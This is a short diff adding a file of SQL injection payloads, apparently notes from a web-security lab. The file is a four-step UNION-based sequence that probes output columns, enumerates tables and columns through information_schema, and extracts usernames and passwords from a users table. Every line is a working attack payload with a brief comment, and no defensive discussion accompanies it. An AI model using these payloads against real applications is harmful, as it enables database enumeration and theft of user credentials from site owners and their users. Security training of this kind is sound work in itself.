@@ -1,0 +1,8 @@
+'+UNION+SELECT+'abc','def'--  #  identify the tables with text
+
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--  # identify the tables contents
+
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--  # identify the columns in the table.
+
+'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--  # retrieve the username and passwords 
+
